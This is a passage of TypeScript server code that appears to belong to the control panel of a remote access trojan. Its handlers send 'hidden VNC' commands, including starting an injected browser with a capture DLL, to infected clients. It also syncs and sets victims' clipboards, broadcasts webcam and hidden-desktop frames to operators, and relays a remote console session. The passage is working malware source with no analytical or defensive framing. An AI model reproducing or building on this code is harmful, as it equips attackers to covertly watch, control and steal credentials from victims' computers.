      if (captureDllBrowser) browserCmdPayload.capture_dll = captureDllBrowser;
      sendHVNCCommand(target, "hvnc_start_browser_injected", browserCmdPayload);
      break;
    }
    case "clipboard_sync": {
      if (!state.isStreaming) break;
      const text = String(payload.text || "");
      if (text) {
        sendHVNCCommand(target, "clipboard_set", { text });
      }
      break;
    }
    case "clipboard_sync_start": {
      if (!state.isStreaming) break;
      sendDesktopCommand(target, "clipboard_sync_start", { source: "hvnc" });
      break;
    }
    case "clipboard_sync_stop": {
      sendDesktopCommand(target, "clipboard_sync_stop", {});
      break;
    }
    default:
      break;
  }
}

export function sendHVNCCommand(target: ClientInfo, commandType: string, payload: any) {
  target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
}

(globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
  const buf = buildViewerFrameBuffer(bytes, header);
  return broadcastFrameToViewers(sessionManager.getHvncSessionsForClient(clientId), buf, header);
};

(globalThis as any).__webcamBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
  const buf = buildViewerFrameBuffer(bytes, header);
  return broadcastFrameToViewers(sessionManager.getWebcamSessionsForClient(clientId), buf, header);
};

const textDecoder = new TextDecoder();

export function handleConsoleViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload) return;
  if (!payload || typeof payload.type !== "string") {
    return;
  }

  const { clientId, sessionId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
    return;
  }

  switch (payload.type) {
    case "input": {
      const data = typeof payload.data === "string" ? payload.data : "";
      sendConsoleCommand(target, "console_input", { sessionId, data });
      break;
    }
    case "resize": {
      const cols = Number(payload.cols) || 120;
      const rows = Number(payload.rows) || 36;
      sendConsoleCommand(target, "console_resize", { sessionId, cols, rows });
      break;
    }
    case "stop": {
      if (!sessionId) break;
      stopConsoleOnTarget(target, sessionId);
      break;
    }
    default:
      break;
  }
}

export function handleConsoleOutput(clientId: string, payload: any) {
  const sessionId = payload.sessionId as string;
  if (!sessionId) return;
  const session = sessionManager.getConsoleSession(sessionId);
  if (!session) return;
  if (session.clientId !== clientId) return;
  const data = payload.data ? textDecoder.decode(payload.data as Uint8Array) : "";
  safeSendViewer(session.viewer, {
    type: "output",
    sessionId,
    data,
    exitCode: payload.exitCode,
    error: payload.error,
  });
  if (payload.exitCode !== undefined || payload.error) {
    const reason = payload.error ? payload.error : `Process exited (${payload.exitCode ?? ""})`;
    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId });
    sessionManager.deleteConsoleSession(sessionId);
  }
}
